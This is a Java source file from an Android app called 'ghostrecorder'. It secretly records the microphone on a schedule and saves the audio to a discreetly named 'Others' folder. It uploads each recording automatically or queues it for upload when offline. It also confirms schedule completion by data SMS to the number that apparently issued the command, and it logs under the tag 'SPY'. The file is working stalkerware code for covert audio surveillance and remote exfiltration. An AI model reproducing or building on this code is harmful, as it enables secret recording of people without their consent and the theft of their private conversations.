package com.byteshaft.ghostrecorder;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.TimeZone;

public class RecorderHelpers extends ContextWrapper implements
        CustomMediaRecorder.OnNewFileWrittenListener,
        CustomMediaRecorder.OnRecordingStateChangedListener {

    private static CustomMediaRecorder sRecorder;
    private static PendingIntent pendingIntent;
    private static AlarmManager alarmManager;
    private final int FIFTEEN_MINUTES = 15 * 1000 * 60;
    private int mCompleteRepeats;
    private float mPartialRepeats;
    private int mRecordingGap;
    private int mRecordingInstance;
    private int mSplitFull;
    private float mSplitPartial;
    private int mSplitDuration;
    private boolean mScheduleEnded;
    private boolean mStoppedWithInDirectCommand;

    private BroadcastReceiver mScheduledRecordingsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int time = intent.getExtras().getInt("RECORD_TIME", mRecordingInstance);
            String fileName = intent.getExtras().getString("FILE_NAME", null);
            startRecording(time, fileName);
        }
    };

    public RecorderHelpers(Context base) {
        super(base);
    }

    private void startRecording(int time, String fileName) {
        if (CustomMediaRecorder.isRecording()) {
            Log.i("SPY", "Recording already in progress");
            return;
        }

        if (fileName == null) {
            fileName = getTimeStamp();
        }
        String path = Environment.getExternalStorageDirectory() + "/" + "Others/" + fileName + ".aac";
        sRecorder = CustomMediaRecorder.getInstance();
        sRecorder.reset();
        sRecorder.setOnNewFileWrittenListener(this);
        sRecorder.setOnRecordingStateChangedListener(this);
        sRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        sRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        sRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        sRecorder.setAudioEncodingBitRate(16000);
        sRecorder.setDuration(time);
        sRecorder.setOutputFile(path);

        try {
            sRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println("Recording for: " + time);
        sRecorder.start();
        AppGlobals.saveLastRecordingFilePath(path);
    }

    void startRecording(int time, String fileName, int splitDuration) {
        if (fileName == null) {
            fileName = getTimeStamp();
        }

        if (splitDuration == 0 && time < FIFTEEN_MINUTES) {
            startRecording(time, fileName);
            return;
        } else if (splitDuration == 0 && time > FIFTEEN_MINUTES) {
            mSplitDuration = FIFTEEN_MINUTES;
            float parts = (float) time / (float) mSplitDuration;
            mSplitFull = (int) parts;
            mSplitPartial = parts - mSplitFull;
            startRecording(mSplitDuration, fileName);
            return;
        }
    }

    void startRecording(int totalTime, int gapInterval, int recordingInstance) {
        IntentFilter filter = new IntentFilter("com.byteshaft.startAlarm");
        getApplicationContext().registerReceiver(mScheduledRecordingsReceiver, filter);
        mRecordingGap = gapInterval;
        float parts = (float) totalTime / (float) recordingInstance;
        mCompleteRepeats = (int) parts;
        mPartialRepeats = parts - mCompleteRepeats;
        mRecordingInstance = recordingInstance;
        startRecording(mRecordingInstance, null);
        mCompleteRepeats--;
    }

     void stopRecording() {
        if (CustomMediaRecorder.isRecording()) {
            sRecorder.stop();
            sRecorder.reset();
            sRecorder.release();
            cancelAlarm();
            sRecorder = null;
        }
    }

    void stopRecording(boolean actInDirect) {
        mStoppedWithInDirectCommand = actInDirect;
        stopRecording();
    }

    void createRecordingDirectoryIfNotAlreadyCreated() {
        File recordingsDirectory = new File(Environment.getExternalStorageDirectory() + "/" + "Others");
        if (!recordingsDirectory.exists()) {
            recordingsDirectory.mkdir();
        }
    }

    static void cancelAlarm() {
        if (alarmManager != null && pendingIntent != null) {
            alarmManager.cancel(pendingIntent);
        }
    }

    private String getTimeStamp() {
        SimpleDateFormat dateFormatGmt = new SimpleDateFormat("yyyyMMddhhmmss");
        dateFormatGmt.setTimeZone(TimeZone.getTimeZone("GMT"));
        return dateFormatGmt.format(new Date());
    }

    @Override
    public void onNewRecordingCompleted(String path) {
        ArrayList<String> arrayList = new ArrayList<>(Arrays.asList(path));
        UploadRecordingTaskHelpers  uploadRecordingTaskHelpers
                = new UploadRecordingTaskHelpers(getApplicationContext());
        if (uploadRecordingTaskHelpers.isNetworkAvailable()) {
            new UploadRecordingTask(getApplicationContext()).execute(arrayList);
        } else {
            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
                    (getApplicationContext());;
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, path);
        }
    }

    @Override
    public void onStop(int stopper, String fileName) {
        switch (stopper) {
            case AppGlobals.STOPPED_AFTER_TIME:
                if (mCompleteRepeats > 0) {
                    Intent intent = new Intent("com.byteshaft.startAlarm");
                    intent.putExtra("FILE_NAME", getFileNameForNextRecording(fileName));
                    pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
                    alarmManager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + mRecordingGap, pendingIntent);
                    mCompleteRepeats--;
                    mScheduleEnded = true;
                    return;
                } else if (mPartialRepeats != 0) {
                    int time = (int) (mRecordingInstance * mPartialRepeats);
                    Intent intent = new Intent("com.byteshaft.startAlarm");
                    intent.putExtra("FILE_NAME", getFileNameForNextRecording(fileName));
                    intent.putExtra("RECORD_TIME", time);
                    pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
                    alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + mRecordingGap, pendingIntent);
                    mPartialRepeats = 0;
                    mScheduleEnded = true;
                    return;
                }

                if (mScheduleEnded) {
                    Helpers.sendDataSmsResponse(Helpers.originatingAddress, BinarySmsReceiver.responsePort, "Recording Stopped. Schedule Completed.");
                }

                if (mSplitFull > 0) {
                    startRecording(mSplitDuration, getFileNameForNextRecording(fileName));
                    mSplitFull--;
                    return;
                }

                if (mSplitPartial > 0) {
                    startRecording((int) (mSplitDuration * mSplitPartial), getFileNameForNextRecording(fileName));
                    mSplitPartial = 0;
                }
                break;
            case AppGlobals.STOPPED_WITH_DIRECT_CALL:
                if (!mStoppedWithInDirectCommand) {
                    Helpers.resetAllRecordTimes();
                }
                break;
            case AppGlobals.SERVER_DIED:
                break;
        }
    }

    private String getFileNameForNextRecording(String currentPath) {
        File file = new File(currentPath);
        String name = file.getName();
        String nameNoExtension = name.substring(0, name.lastIndexOf('.'));
        String[] title = nameNoExtension.split("-");

        if (title.length == 1) {
            return title[0] + "-" + "1";
        } else if (title.length == 2) {
            String baseName = title[0];
            int iterator = Integer.valueOf(title[1]) + 1;
            return baseName + "-" + iterator;
        } else {
            return null;
        }
    }
}